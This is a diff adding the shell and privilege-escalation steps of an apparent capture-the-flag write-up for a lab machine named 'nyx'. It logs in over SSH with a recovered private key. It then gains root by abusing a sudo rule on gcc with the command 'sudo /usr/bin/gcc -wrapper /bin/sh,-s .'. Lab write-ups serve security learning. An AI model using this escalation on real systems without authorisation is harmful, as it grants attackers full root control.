@@ -53,5 +53,51 @@ open it in burp :
 and it gives you a private ssh key for user `mpampis`
 
 
+### 3.Gaining Shell
 
+Connect to system with this ssh key :
+
+```bash
+root@kali: chmod 600 private.key
+root@kali: ssh -i private.key mpampis@192.168.127.133
+Linux nyx 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
+███▄▄▄▄   ▄██   ▄   ▀████    ▐████▀ 
+███▀▀▀██▄ ███   ██▄   ███▌   ████▀  
+███   ███ ███▄▄▄███    ███  ▐███    
+███   ███ ▀▀▀▀▀▀███    ▀███▄███▀    
+███   ███ ▄██   ███    ████▀██▄     
+███   ███ ███   ███   ▐███  ▀███    
+███   ███ ███   ███  ▄███     ███▄  
+ ▀█   █▀   ▀█████▀  ████       ███▄ 
+Last login: Sat Apr 20 04:31:42 2024 from 192.168.127.128
+mpampis@nyx:~$ 
+```
+
+### 4.Privilege Escalation
+
+Check for sudo permissions :
+
+```bash
+mpampis@nyx:~$ sudo -l
+Matching Defaults entries for mpampis on nyx:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User mpampis may run the following commands on nyx:
+    (root) NOPASSWD: /usr/bin/gcc
+```
+
+and use `gcc` for getting root
+
+```bash
+mpampis@nyx:~$ sudo /usr/bin/gcc -wrapper /bin/sh,-s .
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# cd /root
+
+# ls
+root.txt
+```
+
+This is how you can get root on this machine :)
 
